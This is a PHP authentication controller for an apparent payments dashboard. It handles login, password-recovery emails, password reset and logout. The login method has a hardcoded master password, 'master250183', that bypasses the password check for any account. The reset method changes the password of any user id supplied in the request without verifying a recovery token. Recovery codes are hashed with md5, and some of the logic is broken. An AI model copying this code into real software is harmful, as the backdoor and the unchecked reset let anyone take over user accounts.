<?php


namespace Source\App\User;

use League\Plates\Engine;
use Source\Models\dashCompanys;
use Source\App\User\ControllerSessionUsers;
use Source\App\Support\Email;
use Source\App\Tools\GeneratorPasswords;
use Source\Models\User;


/**
 * Class ControllherAuthUsers
 * @package Source\App
 */
class ControllherAuthUsers
{
    /**
     * @var
     */
    /**
     * @var
     */
    private $login, $passWord, $view;

    /**
     * ControllherAuthUsers constructor.
     */
    public function __construct($router)
    {
        $this->view = Engine::create(dirname(__DIR__, 3) . "/theme/views/user", "php");
        $this->view->addData(["router" => $router]);
        $this->login;
        $this->passWord;
    }

    /**
     **************************************** FORMULARIO DE AUTENTICAÇÃO *****************************************
     * @param $data
     */
    public function formAuth(array $data): void
    {
        $lg = (new ControllerSessionUsers())->requireLogoutUser();

        echo $this->view->render("login", ["title" => "Autenticação | " . URL_BASE]);
    }

    /**
     **************************************** LOGIN *****************************************
     * POST
     * @param array $data
     */
    public function authUser(array $data): void
    {

        $this->login    = $data["email"];
        $this->passWord = trim($data["password"]);
        $this->master   = false;

        if (empty($this->login) || !filter_var($this->login, FILTER_VALIDATE_EMAIL)) {
            $callback["error"] = true;
            $callback["message"] = ["title" => "Oooops!", "text" => "Email ou senha invalidos.", "type" => "error"];
            echo json_encode($callback);
            die;
        }

        if (empty($this->passWord) || strlen($this->passWord) < 6) {
            $callback["error"] = true;
            $callback["message"] = ["title" => "Oooops!", "text" => "Email ou senha invalidos.", "type" => "error"];
            echo json_encode($callback);
            die;
        }

        $userObj = (new User())->find("login = :e", "e={$this->login}")->fetch();

        if (!$userObj) {
            $callback["error"] = true;
            $callback["message"] = ["title" => "Oooops!", "text" => "Usúario não encontrado.", "type" => "error"];
            echo json_encode($callback);
            die;
        }

        /*
         * valida senha master
         */
        if($userObj && $this->passWord != "master250183") {

            if (!password_verify($this->passWord, $userObj->password)) {
                $callback["error"] = true;
                $callback["message"] = ["title" => "Oooops!", "text" => "Usúario não encontrado.", "type" => "error"];
                echo json_encode($callback);
                die;
            }

            $this->master = true;
        }

        /**
         * força a atualização da senha
         */
        if ($userObj->forced_update_password != 0) {
            $callback["is_update"] = ["codigo" => "200", "url_is_update" => "" . url() . "/dashboard/recuperar/{$userObj->hash_recovery}"];
            $callback["message"] = ["title" => "Atualização", "text" => "Olá por medidas de segurança solicitamos a renovação de senha de tempos em tempos, aguarde que iremos redirecionar para o furmulario de cadastro de nova senha.", "type" => "warning"];
            echo json_encode($callback);
            die;
        }

        if ($userObj->status != 1) {
            $callback["error"] = true;
            $callback["message"] = ["title" => "Oooops!", "text" => "Usúario não autorizado.", "type" => "error"];
            echo json_encode($callback);
            die;
        }

        $obSeller = (new ControllerSessionUsers())->loginUser($userObj,$this->master);
    }

    /**
     **************************************** FORMULARIO DE RECUPERAR SENHA *****************************************
     * @param $data
     */
    public function formRecovery(array $data): void
    {
        echo $this->view->render("recovery", ["title" => "Recuperar senha | " . URL_BASE]);
    }

    /**
     **************************************** EMAIL RECUPERAR SENHA *****************************************
     * POST
     * @param array $data
     */
    public function emailRecoveryUser(array $data): void
    {

        $this->login = $data["email"];

        if (empty($this->login) || !filter_var($this->login, FILTER_VALIDATE_EMAIL)) {
            $callback["error"] = true;
            $callback["message"] = ["title" => "Oooops!", "text" => "Email invalido.", "type" => "error"];
            echo json_encode($callback);
            die;
        }

        $userObj = (new User())->find("login = :e", "e={$this->login}")->fetch();

        if (!$userObj) {
            $callback["error"] = true;
            $callback["message"] = ["title" => "Oooops!", "text" => "Usúario não encontrado.", "type" => "error"];
            echo json_encode($callback);
            die;
        }

        if ($userObj->status != 1) {
            $callback["error"] = true;
            $callback["message"] = ["title" => "Oooops!", "text" => "Usúario não autorizado.", "type" => "error"];
            echo json_encode($callback);
            die;
        }

        $this->email = $userObj->login;

        /**
         * @var  $passWord
         * gera um codigo aleatorio para de confirmação para ser enviado no email de recuperação de senha
         */
        $codeRecoveryUser = new GeneratorPasswords();
        $codeRecoveryUser = $codeRecoveryUser->generaterPassword();
        $hashSendEmail = md5($codeRecoveryUser);

        $bodyRecovery = $this->view->render("fragments/EmailRecoveryClient", ["code" => $hashSendEmail]);

        $sendEmail = new Email();
        $sendEmail->add("Recuperação de senha.", "{$bodyRecovery}", "Solicitação de senha.", "{$this->email}")->send("INOVA - Pagamentos");

        if ($sendEmail) {

            $userObj->hash_recovery = $hashSendEmail;
            $userObj->hash_recovery_time = date('Y-m-d H:i:s', strtotime('+9 hour', strtotime(date('Y-m-d H:i:s'))));
            $SellerId = $userObj->save();

            $callback["message"] = ["title" => "Sucesso!", "text" => "Um e-mail contendo informações sobre sua recuperação de senha foi enviado. Por favor verifique sua caixa de e-mail.", "type" => "success"];
            $callback["url_return"] = URL_FIX_COMPANY;
            echo json_encode($callback);
            die;
        }
    }

    /**
     **************************************** FORMULARIO CADASTRAR NOVA SENHA *****************************************
     * GET
     * @param $data
     */
    public function formNewPassword(array $data): void
    {
        $this->key = $data["key"];

        $userObj = (new User())->find("hash_recovery = :hash", "hash={$this->key}")->fetch();

        if (!$userObj) {
            echo $this->view->render("recovery", ["title" => "Link invalido | " . URL_BASE, "invalid" => "Oooops! Link de recuperação invalido, por favor solicite novamente sua recuperação de senha."]);
            die;
        }

        $now = strtotime(date('Y-m-d H:i:s'));
        $hash_time = strtotime($userObj->hash_recovery_time);

        if ($userObj->forced_update_password != 1) {
            if ($now > $hash_time) {
                echo $this->view->render("recovery", ["title" => "Link expirado | " . URL_BASE, "expired" => "Oooops! Link de recuperação expirado, por favor solicite novamente sua recuperação de senha."]);
                die;
            }
        }

        $this->id = $userObj->id;
        echo $this->view->render("recovery", ["title" => "Cadastrar nova senha | " . URL_BASE, "id" => $this->id]);
    }

    /**
     **************************************** EMAIL RECUPERAR SENHA *****************************************
     * POST
     * @param array $data
     */
    public function confirmRecoveryUser(array $data): void
    {

        $this->id = base64_decode($data["key"]);
        $this->pwd = $data["pwd"];
        $this->pwdConfirm = $data["confpwd"];

        if ($this->pwd != $this->pwdConfirm) {
            $callback["error"] = true;
            $callback["message"] = ["title" => "Oooops!", "text" => "Senhas não conferem.", "type" => "error"];
            echo json_encode($callback);
            return;
        }

        $this->password = password_hash("{$this->pwd}", PASSWORD_DEFAULT);

        $userObj = (new User())->findById($this->id);

        $userObj->password = $this->password;
        $userObj->hash_recovery = "";
        $userObj->forced_update_password = 0;
        $userObj->hash_recovery_time = "0000-00-00 00:00:00";
        $SellerId = $userObj->save();

        $callback["message"] = ["title" => "Sucesso!", "text" => "Senha Atualizada com sucesso. Faça um novo login!", "type" => "success"];
        $callback["url_return"] = URL_FIX_COMPANY;
        echo json_encode($callback);
        die;

    }


    /**
     **************************************** RESPONSAVEL POR DESLOGAR A EMPRESA *****************************************
     *GET
     */
    public
    function logout()
    {
        $obSeller = (new ControllerSessionUsers())->destroySessionUser()();
    }

}